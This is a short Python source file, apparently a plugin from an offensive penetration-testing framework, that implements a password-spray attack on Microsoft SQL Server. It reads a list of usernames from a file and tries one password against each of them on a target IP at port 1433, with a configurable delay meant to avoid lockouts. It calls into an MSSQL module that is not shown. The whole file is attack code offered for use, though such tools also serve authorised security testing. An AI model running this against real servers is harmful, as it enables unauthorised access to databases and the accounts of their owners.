# scripts/mssql/attack/password_spray.py
from scripts.base import BaseScript
from modules.mssql import MSSQLModule
from core.output import print_result

class Script(BaseScript):
    name        = "password-spray"
    protocol    = "mssql"
    category    = "attack"
    description = "Password spray MSSQL: una contrasena contra lista de usuarios con delay."

    def run(self, **kwargs):
        userlist = kwargs.get("userlist")
        password = kwargs.get("password") or self.creds.password or ""
        port     = int(kwargs.get("port") or 1433)
        delay    = float(kwargs.get("delay") or 1)
        if not userlist:
            print_result("MSSQL", self.target.ip, "fail", "userlist no especificado"); return []
        try:
            with open(userlist) as f:
                users = [l.strip() for l in f if l.strip()]
        except OSError as e:
            print_result("MSSQL", self.target.ip, "fail", "no se pudo leer userlist: " + str(e))
            return []
        mod = MSSQLModule(self.target, self.creds)
        return mod.password_spray(users, password, delay=delay)
